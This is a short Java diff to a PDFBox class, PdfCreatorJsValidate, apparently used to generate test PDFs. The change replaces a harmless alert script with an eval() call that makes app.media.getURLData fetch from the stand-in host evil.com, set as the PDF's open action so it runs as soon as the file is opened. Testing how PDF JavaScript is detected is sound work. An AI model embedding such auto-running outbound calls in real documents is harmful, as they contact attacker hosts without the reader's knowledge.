@@ -42,7 +42,10 @@ public class PdfCreatorJsValidate {
 	      doc.getDocumentCatalog().setAcroForm(acroForm);
 
 	      PDActionJavaScript javascript = new PDActionJavaScript(
-	          "function validate(index){ app.alert({cMsg:'this is an example' + index,nIcon:3,nType: 0,cTitle:'PDFBox Javascript example'}); }");
+	    		  "eval(\n"
+	    		  + "          'app.media.getURLData(\"http://geturldata.evil.com/\", \"audio/mp3\");'\n"
+	    		  + "          );"
+	    		  );
 	      doc.getDocumentCatalog().setOpenAction(javascript);
 
 	      COSDictionary cosDict = new COSDictionary();
